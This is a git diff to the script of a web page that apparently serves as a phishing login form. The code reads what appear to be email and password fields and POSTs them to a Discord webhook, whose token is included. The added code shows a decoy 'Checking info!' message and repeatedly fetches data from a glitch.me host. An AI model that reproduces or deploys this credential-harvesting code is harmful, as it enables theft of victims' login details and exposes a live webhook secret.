@@ -7,8 +7,20 @@
   </body>
 </html>
 <script>
- 
-document.getElementById("xd").onclick = function(){sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value)};
+
+document.getElementById("xd").onclick = function(){firstCheck()};
+function firstCheck(){
+  if(!document.getElementById("ema").value == "" && !document.getElementById("ntra").value == ""){
+    sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value);
+    setTimeout(()=>{
+      document.write("Checking info!");
+      setInterval(()=>{
+        fetch('https://yaberry.glitch.me/putamadre.txt').then(response => response.json())
+          .then(data => document.title = data);
+      }, 5000);
+    }, 2500);
+  }
+}
 function sendMessage(e,p) {
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");
